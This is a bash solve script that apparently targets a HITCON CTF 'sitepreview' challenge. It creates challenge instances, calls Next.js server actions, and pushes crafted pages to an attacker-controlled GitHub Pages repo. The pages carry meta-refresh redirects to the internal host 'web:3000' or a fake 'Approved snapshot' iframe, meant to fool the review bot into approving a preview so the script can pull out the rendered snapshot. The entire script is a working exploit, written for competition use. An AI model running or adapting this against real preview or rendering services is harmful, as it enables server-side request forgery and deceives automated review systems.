#!/bin/bash
set -o pipefail
BASE_EXT="https://sitepreview.chal.hitconctf.com"
VARIANT="${VARIANT:-redirect}"
get_port() { curl -s -b cookies.txt --max-time 30 "$BASE_EXT/" | grep -oE 'http://sitepreview\.chal\.hitconctf\.com:[0-9]+' | head -1; }
PORT=$(get_port)
if [ -z "$PORT" ]; then
  curl -s -c cookies.txt -b cookies.txt -X POST "$BASE_EXT/create" -d "token=$TEAM_TOKEN" -o /dev/null
  sleep 5; PORT=$(get_port)
fi
echo "INSTANCE=$PORT"
probe=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "$PORT/" || true)
if [ "$probe" != "200" ]; then
  echo "recreating instance (probe=$probe)"
  curl -s -b cookies.txt -X POST "$BASE_EXT/stop" -o /dev/null
  sleep 3
  curl -s -c cookies.txt -b cookies.txt -X POST "$BASE_EXT/create" -d "token=$TEAM_TOKEN" -o /dev/null
  sleep 5; PORT=$(get_port); echo "INSTANCE2=$PORT"
fi
for i in $(seq 1 45); do code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 15 "$PORT/" || true); [ "$code" = "200" ] && break; sleep 2; done
[ "$code" = "200" ] || { echo "NOT READY"; exit 1; }

CREATE_ID="40826ee1e38d462252e0a1f6761f0741fca9607bbe"
REVIEW_ID="400cce7790f1e3554d5a9d0db54d9870b9ca678be9"
mkprev() {
  ENC=$(python3 -c "import json,sys;print(json.dumps([sys.argv[1]]))" "$1")
  R=$(curl -s --max-time 60 -X POST "$PORT/" -H "Next-Action: $CREATE_ID" -H "Content-Type: text/plain;charset=UTF-8" -d "$ENC")
  echo "$R" | grep -oE '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' | head -1
}
reqrev() {
  PAGE=$(curl -s --max-time 30 "$PORT/preview/$1")
  BLOB=$(echo "$PAGE" | python3 -c "
import sys,re
h=sys.stdin.read()
m=re.search(r'1c:.\\\\\"([A-Za-z0-9+/=]{50,})\\\\\"', h) or re.search(r'1c:\"([A-Za-z0-9+/=]{50,})\"', h) or re.search(r'1c:.\"([A-Za-z0-9+/=]{50,})', h)
print(m.group(1) if m else 'NOBLOB')")
  [ "$BLOB" = "NOBLOB" ] && { echo "NOBLOB"; return 1; }
  RR=$(curl -s --max-time 90 -X POST "$PORT/preview/$1" -H "Next-Action: $REVIEW_ID" -H "Content-Type: text/plain;charset=UTF-8" -d "[$BLOB]")
  if echo "$RR" | grep -q '"E{'; then echo "ERR"; else echo "OK"; fi
}
dec() { curl -s --max-time 15 "$PORT/render/$1" | grep -oE '(Approved|Rejected)' | head -1 || true; }

for ITER in 1 2 3 4 5 6; do
  echo "=== ITER $ITER variant=$VARIANT ==="
  PID=$(mkprev "https://marlobbz.github.io/sitepreview-test/")
  [ -z "$PID" ] && { echo CREATE_FAILED; sleep 20; continue; }
  echo "PID=$PID"

  python3 - <<PYEOF
pid = "$PID"
v = "$VARIANT"
common_css = "body{font-family:system-ui,sans-serif;margin:0;color:#1a202c}header{background:linear-gradient(135deg,#5a67d8,#9f7aea);color:#fff;padding:60px 20px;text-align:center}main{max-width:960px;margin:40px auto;padding:0 20px}footer{background:#2d3748;color:#a0aec0;text-align:center;padding:24px;margin-top:40px}"
head = f'<meta charset="utf-8"><title>Aurora Design — Creative Studio</title><style>{common_css}</style>'
body_core = '<header><h1>Aurora Design</h1><p>Creative studio for modern brands</p></header><main><p>We craft brands, websites and products for ambitious teams.</p><p>Established 2019. Based in Taipei.</p></main><footer>© 2026 Aurora Design Studio</footer>'
if v == "redirect":
    html = f'<!doctype html><html lang="en"><head>{head}<meta http-equiv="refresh" content="0;url=http://web:3000/preview/{pid}"></head><body><!--{pid}-->{body_core}</body></html>'
elif v == "redirect-ext":
    html = f'<!doctype html><html lang="en"><head>{head}<meta http-equiv="refresh" content="0;url=http://sitepreview.chal.hitconctf.com:30854/preview/{pid}"></head><body>{body_core}</body></html>'
elif v == "fakefast":
    html = f'<!doctype html><html lang="en"><head>{head}</head><body>{body_core}<main><section><h2>Live preview widget</h2><div style="border:1px solid #e2e8f0;border-radius:12px;overflow:hidden"><iframe src="https://marlobbz.github.io/sitepreview-test/render-page/{pid}/" title="Website snapshot" width="100%" height="480" style="border:0"></iframe></div></section></main></body></html>'
else:
    html = f'<!doctype html><html lang="en"><head>{head}</head><body>{body_core}</body></html>'
open("index.html","w").write(html)
print("built", v)
PYEOF

  # also build the inner fake render page for fakefast
  if [ "$VARIANT" = "fakefast" ]; then
    mkdir -p render-page/$PID
    cat > render-page/$PID/index.html <<EOF2
<!doctype html><html><head><meta charset="utf-8"><title>Website snapshot</title></head>
<body><div><span>Website snapshot</span><h1>aurora</h1></div><img alt="Approved snapshot" width="640" height="480"><footer><span>SitePreview</span></footer></body></html>
EOF2
  fi
  git add -A && git -c user.email=bot@users.noreply.github.com -c user.name="Actions bot" commit -qm "iter$ITER $VARIANT $PID" && git push -q origin main || { echo PUSH_FAILED; continue; }
  LIVE=0
  for i in $(seq 1 18); do
    C=$(curl -s --max-time 15 "https://marlobbz.github.io/sitepreview-test/" | grep -c "$PID" || true)
    [ "$C" -ge 1 ] && { LIVE=1; echo "PAGE_LIVE ${i}0s"; break; }
    sleep 10
  done
  [ $LIVE -eq 1 ] || { echo PAGE_NOT_LIVE; continue; }

  RR=$(reqrev "$PID")
  echo "REVIEW_$RR"
  [ "$RR" = "OK" ] || continue
  T0=$(date +%s); S=""
  while true; do
    S=$(dec "$PID")
    NOW=$(date +%s)
    [ -n "$S" ] && { echo "DECISION=$S AT=+$((NOW-T0))s"; break; }
    [ $((NOW-T0)) -gt 100 ] && { echo "DECISION=timeout"; break; }
    sleep 3
  done
  if [ "$S" = "Approved" ]; then
    echo "APPROVED! extracting..."
    curl -s --max-time 30 "$PORT/render/$PID" -o render_page.html
    python3 - <<PYEOF
import re, base64
h = open("render_page.html").read()
m = re.search(r'dataUrl":"(data:image/[^"]+)', h) or re.search(r'dataUrl\\":\\"(data:image/[^\\]+)', h)
if m:
    du = m.group(1)
    open("snapshot_dataurl.txt","w").write(du)
    open("snapshot.png","wb").write(base64.b64decode(du.split(",",1)[1]))
    print("SNAPSHOT_SAVED")
else:
    print("NO_DATAURL")
PYEOF
    break
  fi
done
echo "DONE variant=$VARIANT"
